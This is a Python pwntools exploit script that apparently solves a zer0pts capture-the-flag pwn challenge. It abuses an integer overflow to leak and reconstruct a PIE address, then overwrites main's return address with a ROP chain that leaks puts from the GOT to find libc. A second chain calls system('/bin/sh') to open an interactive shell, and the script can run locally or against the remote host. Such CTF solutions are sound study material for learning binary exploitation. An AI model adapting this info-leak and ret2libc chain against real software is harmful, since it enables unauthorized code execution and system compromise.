#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "pwn1.ctf.zer0pts.com"
PORT = 9001
PROCESS = "./chall"

def set_item(price, qty):
	r.sendlineafter(": ", str(price))
	r.sendlineafter(": ", str(qty))

def get_val(val):
	if val > 0x7fffffff:
		val -= 0x100000000

	if val < 0:
		val += 0x100000000

	return val

def calc_leak(leak):
	for i in range(0x2000):
		for j in range(0x5500, 0x55ff, 1):
			# create possible 64 bit result and revert imul
			val = i<<32
			val += leak		
			val /= j

			# check if lsb matches the expected value
			if val & 0xfff == 0xb6c:
				result = j << 32
				result += val

				# double check: simulate imul with specific values
				t1 = result >> 32
				t2 = result & 0xffffffff

				test = (t1 * t2) & 0xffffffff

				# check if the result matches the original leak
				if test == leak:
					log.info("Double check good")
					return result

	log.info("None found")
					
def modify(idx, value):	
	r.sendlineafter(": ", str(idx))
	r.sendlineafter("Price: ", str(value & 0xffffffff))
	r.sendlineafter("Quantity: ", str(value >> 32))
	
def exploit(r):
	r.sendlineafter(": ", str(0x2000000000000000))	

	r.recvuntil("Total: $")
	val = get_val(int(r.recvline()[:-1]))
	PIELEAK = calc_leak(val)
	e.address = PIELEAK-191-e.symbols["main"]

	log.info("PIE      : %s" % hex(PIELEAK))
	log.info("ELF      : %s" % hex(e.address))

	r.sendlineafter("[1=Yes] ", "1")
	
	POPRDI = e.address + 0x0000000000000d53
	POPRSI15 = e.address + 0x0000000000000d51
	RET = e.address + 0x00000000000007be

	payload = p64(POPRDI)
	payload += p64(e.got["puts"])
	payload += p64(e.plt["puts"])
	payload += p64(e.address + 0x880)

	# write ropchain to return address of main
	for i in range(0, len(payload), 8):
		modify((0x58+i)/8, u64(payload[i:i+8]))

	r.sendlineafter(": ", "-1")                  # trigger exit (ropchain)

	r.recvuntil("work!\n")
	LEAK = u64(r.recvline()[:-1].ljust(8, "\x00"))
	libc.address = LEAK - 0x84450

	log.info("LEAK      : %s" % hex(LEAK))
	log.info("LIBC      : %s" % hex(libc.address))

	payload = p64(POPRDI)
	payload += p64(next(libc.search("/bin/sh")))
	payload += p64(POPRSI15)
	payload += p64(0)
	payload += p64(0)
	payload += p64(libc.symbols["system"])

	r.sendlineafter(": ", str(0x2000000000000000))	
	r.sendlineafter("[1=Yes] ", "1")

	for i in range(0, len(payload), 8):
		modify((0x58+i)/8, u64(payload[i:i+8]))
	
	r.sendlineafter(": ", "-1")                  # trigger exit (ropchain)

	r.interactive()
	
	return

if __name__ == "__main__":
	e = ELF("./chall")
	libc = ELF("./libc-2.31.so")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./chall", env={"LD_PRELOAD":"./libc-2.31.so"})
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)